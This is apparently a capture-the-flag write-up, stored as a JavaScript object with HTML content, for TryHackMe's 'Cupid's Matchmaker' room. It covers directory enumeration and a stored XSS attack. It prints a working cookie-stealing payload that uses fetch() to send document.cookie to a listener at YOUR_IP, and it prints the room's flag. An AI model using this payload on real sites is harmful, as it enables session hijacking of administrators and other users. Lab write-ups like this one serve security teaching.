const WRITEUP = {
  slug:        "thm-cupids-matchmaker",
  title:       "TryHackMe — Cupid's Matchmaker",
  date:        "2026-03-21",
  platform:    "TryHackMe",
  os:          "Linux",
  difficulty:  "easy",
  tags:        ["web"],
  description: "Stored XSS via a survey form — injecting a cookie-stealing payload that gets executed by an admin viewing submissions, leaking the flag via a local HTTP listener.",

  toc: [
    { id: "overview",  label: "Overview",           level: 2 },
    { id: "recon",     label: "Recon",              level: 2 },
    { id: "survey",    label: "Survey Page",        level: 2 },
    { id: "gobuster",  label: "Gobuster",           level: 2 },
    { id: "admin",     label: "Admin Page",         level: 2 },
    { id: "xss",       label: "XSS Injection",      level: 2 },
    { id: "flag",      label: "Flag",               level: 2 },
  ],

  content: `
<h2 id="overview">Overview</h2>
<p>
  Cupid's Matchmaker is an easy web challenge on TryHackMe. The application hosts a
  survey form that feeds into an admin panel — a classic setup for
  <strong>stored XSS</strong>. The goal is to inject a cookie-stealing payload into
  the survey so that when an admin views the submissions, their session cookie gets
  sent back to us.
</p>

<div class="callout tip">
  <div class="callout-label">Vulnerability</div>
  Stored Cross-Site Scripting (XSS) — user input is saved to the database and rendered
  unsanitised in the admin panel, causing script execution in the admin's browser.
</div>

<div class="callout flag">
  <div class="callout-label">Flag</div>
  <code>THM{XSS_CuP1d_Str1k3s_Ag41n}</code>
</div>

<h2 id="recon">Recon</h2>
<p>
  The application runs on port <code>5000</code>. Opening it in the browser we are met
  with a welcome page. There is not much visible on the surface — the only obvious
  interactive page is a survey form linked from the home page.
</p>

<figure>
  <img src="images/cupid-home.png" alt="Cupid's Matchmaker home page">
  <figcaption>Fig 1. Welcome page — only the survey is immediately visible</figcaption>
</figure>

<h2 id="survey">Survey Page</h2>
<p>
  The survey form has several input fields. Filling them in and submitting produces
  a confirmation message — the data is clearly being saved somewhere server-side,
  which immediately raises the question of where it ends up and who reads it.
</p>

<figure>
  <img src="images/cupid-survey-confirm.png" alt="Survey submission confirmation message">
  <figcaption>Fig 2. Confirmation message after submitting the survey</figcaption>
</figure>

<p>
  Any form that saves user input and displays it to someone else is a candidate for
  stored XSS. Before testing that theory we first enumerate the application to get a
  fuller picture of what is running.
</p>

<h2 id="gobuster">Directory Enumeration</h2>
<p>
  Running Gobuster against the target reveals a hidden <code>/admin</code> route that
  is not linked from anywhere on the site.
</p>

<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>gobuster dir -u http://TARGET_IP:5000/ -w common.txt</code></pre>
</div>

<figure>
  <img src="images/cupid-gobuster.png" alt="Gobuster output showing /admin route">
  <figcaption>Fig 3. Gobuster discovering the /admin endpoint</figcaption>
</figure>

<h2 id="admin">Admin Page</h2>
<p>
  Navigating to <code>/admin</code> shows a panel — most likely where survey submissions
  are reviewed. This confirms the attack surface: if we can inject a script into the
  survey, it will execute in the admin's browser when they open this page.
</p>

<figure>
  <img src="images/cupid-admin.png" alt="Admin panel page">
  <figcaption>Fig 4. The /admin panel where survey responses are displayed</figcaption>
</figure>

<p>
  Quick attempts at SQL injection in the admin login fields returned nothing useful,
  so we pivot to XSS via the survey.
</p>

<h2 id="xss">XSS Injection</h2>
<p>
  The plan is straightforward — inject a JavaScript payload into every survey field
  that makes the admin's browser send their cookie to our machine the moment they
  view the submissions. We set up a Python HTTP server first to catch the incoming request.
</p>

<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code># Start a listener on port 8000 before submitting the payload
python3 -m http.server 8000</code></pre>
</div>

<p>
  Then we fill every available survey field with the cookie-stealing payload, replacing
  <code>YOUR_IP</code> with our attack machine's IP:
</p>

<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">javascript</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code><script>fetch('http://YOUR_IP:8000/?c='+document.cookie)</script></code></pre>
</div>

<figure>
  <img src="images/cupid-xss-inject.png" alt="XSS payload entered into survey fields">
  <figcaption>Fig 5. Payload injected into all survey input fields</figcaption>
</figure>

<p>
  We submit the survey. The payload is stored in the database. When the admin opens
  their panel to review submissions, the browser renders our script and fires off a
  <code>fetch</code> request to our listener — with the cookie appended as a query
  parameter.
</p>

<figure>
  <img src="images/cupid-flag.png" alt="Python HTTP server receiving the cookie with the flag">
  <figcaption>Fig 6. Incoming request to our listener — flag visible in the cookie value</figcaption>
</figure>

<h2 id="flag">Flag</h2>

<div class="callout flag">
  <div class="callout-label">Flag</div>
  <code>THM{XSS_CuP1d_Str1k3s_Ag41n}</code>
</div>

<hr>

<table>
  <thead>
    <tr><th>Step</th><th>Technique</th><th>Tool</th></tr>
  </thead>
  <tbody>
    <tr><td>Discovery</td><td>Directory enumeration</td><td>Gobuster</td></tr>
    <tr><td>Initial access</td><td>Stored XSS via survey form</td><td>Manual</td></tr>
    <tr><td>Cookie theft</td><td>fetch() exfiltration to local listener</td><td>Python HTTP server</td></tr>
  </tbody>
</table>
`,
};
